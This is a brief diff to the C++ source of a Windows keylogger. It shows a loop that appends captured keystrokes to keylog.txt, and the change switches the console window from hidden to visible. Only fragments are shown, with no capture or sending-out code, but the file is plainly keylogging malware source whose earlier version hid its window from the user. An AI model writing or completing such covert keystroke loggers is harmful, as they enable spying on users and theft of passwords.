@@ -90,8 +90,8 @@ bool SpecialKeys(int S_key)
 
 int main()
 {
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	char key = 'x';
+	ShowWindow(GetConsoleWindow(), SW_SHOW);
+	char key = 'a';
 
 	while (true)
   	{
@@ -102,7 +102,6 @@ int main()
       			{
 				if (SpecialKeys(key) == false)
         			{
-
 					fstream logFile;
 					logFile.open("keylog.txt", fstream::app);
 					if (logFile.is_open())
